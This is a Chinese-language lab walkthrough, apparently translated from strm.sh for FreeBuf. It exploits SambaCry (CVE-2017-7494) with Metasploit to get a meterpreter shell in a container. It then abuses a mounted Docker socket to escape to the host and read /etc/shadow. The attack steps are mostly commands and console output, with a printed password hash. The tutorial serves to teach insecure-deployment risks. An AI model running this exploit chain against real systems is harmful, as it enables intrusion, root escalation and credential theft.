@@ -1,0 +1,219 @@
+## 前言
+
+ **滥用容器（ container）及逃逸的方法有多种，本文将讨论最基本的一种，即滥用docker
+socket来逃逸容器并在宿主机上以root身份执行代码。**
+
+![Docker容器](https://image.3001.net/images/20181115/15422726706000.jpg!small)
+
+## 实验环境设置
+
+由于我们将使用容器，因此你必须安装[docker](https://docker.com/)。
+
+### 创建网络
+
+首先，我们在创建容器的地方创建一个docker网络：
+
+    
+    
+    docker network create pwnage
+
+### 启动易受攻击的容器
+
+在本示例中，我将使用受SambaCry漏洞（CVE-2017-7494）影响的容器。有关该漏洞的更多信息，可以参阅[opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)。
+
+此漏洞允许你在Samba服务器中远程代码执行，我们将docker socket添加到容器中，以下是一个滥用docker的示例。
+
+    
+    
+    docker run --rm -it \
+           --name vulnerable \
+           --network pwnage \
+           -v '/var/run/docker.sock:/var/run/docker.sock' \
+           vulnerables/cve-2017-7494
+
+### 启动攻击机
+
+实验环境设置完成后，接下来我们需要将攻击者的主机添加到网络中。Samba
+Cry存储库中有一个漏洞利用代码，但这里我将使用Metasploit，因为它更容易上传我所需的内容。我已经为此构建了一个映像，只需运行bellow命令，所有内容都将根据实验环境需要运行：
+
+    
+    
+    docker run --rm -it \
+           --network pwnage \
+           -v '/usr/bin/docker:/docker:ro' \
+           strm/metasploit
+
+加载完成后，你将看到如下界面。
+
+![界面](https://image.3001.net/images/20181115/1542243278_5becc3ced7437.png!small)
+
+## 攻击利用
+
+### 信息收集
+
+在任何攻击或测试中，信息收集都是必不可少的一个环节。因此，让我们先来ping下易受攻击的容器检查下当前的连接情况。
+
+    
+    
+    ping -c 2 vulnerable
+
+如果一切正常，你应该能看到以下输出信息。
+
+    
+    
+    msf5 > ping -c 2 vulnerable 
+    [*] exec: ping -c 2 vulnerable 
+    
+    PING vulnerable (172.20.0.2) 56(84) bytes of data.
+    64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=1 ttl=64 time=0.120 ms
+    64 bytes from vulnerable.pwnage (172.20.0.2): icmp_seq=2 ttl=64 time=0.097 ms
+    
+    --- vulnerable ping statistics ---    2 packets transmitted, 2 received, 0% packet loss, time 1009ms
+    rtt min/avg/max/mdev = 0.097/0.108/0.120/0.015 ms
+
+然后，我们进行基本的smb共享枚举：
+
+    
+    
+    use auxiliary/scanner/smb/smb_enumshares
+    set rhosts vulnerable
+    run
+
+输出结果如下：
+
+    
+    
+    msf5 > use auxiliary/scanner/smb/smb_enumshares
+    msf5 auxiliary(scanner/smb/smb_enumshares) > set rhosts vulnerable
+    rhosts => vulnerable
+    msf5 auxiliary(scanner/smb/smb_enumshares) > run
+    
+    [+] 172.20.0.2:139        - data - (DS) Data
+    [+] 172.20.0.2:139        - IPC$ - (I) IPC Service (Crying samba)
+    [*] vulnerable:           - Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+
+可以看到，这个samba服务器中有一个名为data的共享。
+
+### 获取shell
+
+下一步我们要做的是，针对宿主机运行漏洞利用程序获取shell。在Metasploit中，该漏洞名为is_known_pipename，位于exploit/linux/samba/is_known_pipename。
+
+运行bellow命令攻击宿主机：
+
+    
+    
+    use exploit/linux/samba/is_known_pipename
+    set RHOST vulnerable
+    set RPORT 445
+    set payload linux/x64/meterpreter/bind_tcp
+    set TARGET 3
+    set SMB_FOLDER data
+    set SMBUser sambacry
+    set SMBPass nosambanocry
+    exploit
+
+如果一切顺利，你将获取到一个meterpreter shell。如下：
+
+    
+    
+    msf5 > use exploit/linux/samba/is_known_pipename
+    msf5 exploit(linux/samba/is_known_pipename) > set RHOST vulnerable
+    RHOST => vulnerable
+    msf5 exploit(linux/samba/is_known_pipename) > set RPORT 445
+    RPORT => 445
+    msf5 exploit(linux/samba/is_known_pipename) > set payload linux/x64/meterpreter/bind_tcp
+    payload => linux/x64/meterpreter/bind_tcp
+    msf5 exploit(linux/samba/is_known_pipename) > set TARGET 3
+    TARGET => 3
+    msf5 exploit(linux/samba/is_known_pipename) > set SMB_FOLDER data
+    SMB_FOLDER => data
+    msf5 exploit(linux/samba/is_known_pipename) > set SMBUser sambacry
+    SMBUser => sambacry
+    msf5 exploit(linux/samba/is_known_pipename) > set SMBPass nosambanocry
+    SMBPass => nosambanocry
+    msf5 exploit(linux/samba/is_known_pipename) > exploit
+    
+    [*] vulnerable:445 - Using location \\vulnerable\data\ for the path
+    [*] vulnerable:445 - Retrieving the remote path of the share 'data'
+    [*] vulnerable:445 - Share 'data' has server-side path '/data
+    [*] vulnerable:445 - Uploaded payload to \\vulnerable\data\shyyEPPk.so
+    [*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using \\PIPE\/data/shyyEPPk.so...
+    [-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+    [*] vulnerable:445 - Loading the payload from server-side path /data/shyyEPPk.so using /data/shyyEPPk.so...
+    [-] vulnerable:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
+    [*] Started bind TCP handler against vulnerable:4444
+    [*] Sending stage (816260 bytes) to vulnerable
+    
+    meterpreter >
+
+## 提权
+
+我们将通过滥用容器内可用的docker
+socket来提权。由于docker在宿主机上是以root身份运行的，因此它也具有root权限。我们可以滥用它来执行多项操作。例如，使用--privileged选项可以为我们提供许多扩展功能，以下是从docker官方文档中提取的解释文本：
+
+>
+> 默认情况下，Docker的容器是没有特权的，例如不能在容器中再启动一个容器。这是因为默认情况下容器是不能访问任何其它设备的。但是通过"privileged"，容器就拥有了访问任何其它设备的权限。当操作者执行docker
+> run
+> --privileged时，Docker将拥有访问主机所有设备的权限，同时Docker也会在apparmor或者selinux做一些设置，使容器可以容易的访问那些运行在容器外部的设备。
+
+你可以使用--device选项访问设备。但在本示例中，我将映射toor文件系统 (/) 到容器中并访问它。
+
+由于此容器中没有docker客户端，因此下一步我们要做的就是在目标容器中设置docker客户端及其依赖项。你只需运行以下命令，即可完成所有这些操作。
+
+    
+    
+    upload /docker /docker
+    upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
+    chmod 777 /docker
+    chmod +x /docker
+    
+    
+    meterpreter > upload /docker /docker
+    [*] uploading  : /docker -> /docker
+    [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
+    [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
+    [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
+    [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
+    [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker
+    [*] uploaded   : /docker -> /docker
+    meterpreter > upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7
+    [*] uploading  : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
+    [*] Uploaded -1.00 B of 38.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
+    [*] uploaded   : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7
+    meterpreter > chmod 777 /docker
+    meterpreter > chmod +x /docker
+    meterpreter > 
+
+现在，我们就可以使用docker来访问宿主机上的文件系统了。
+
+    
+    
+    execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
+
+我们来转储下本地用户的哈希，输出结果如下：
+
+    
+    
+    meterpreter > execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
+    Process 113 created.
+    Channel 13 created.
+    root:$1$UFKdtFGw$qp29y1qGWit/vnvIG0uSr1:17488:0:99999:7:::
+    daemon:*:17488:0:99999:7:::
+    bin:*:17488:0:99999:7:::
+    sys:*:17488:0:99999:7:::
+    sync:*:17488:0:99999:7:::
+    games:*:17488:0:99999:7:::
+    man:*:17488:0:99999:7:::
+    lp:*:17488:0:99999:7:::
+    mail:*:17488:0:99999:7:::
+    news:*:17488:0:99999:7:::
+
+## 参考文献
+
+> [Metasploit docker image](https://github.com/opsxcq/docker-metasploit)
+>
+> [Vulnerable container](https://github.com/opsxcq/exploit-CVE-2017-7494)
+
+ ** *参考来源：[strm](https://strm.sh/post/abusing-insecure-docker-deployments/)，FB小编secist编译，转载请注明来自FreeBuf.COM**
+
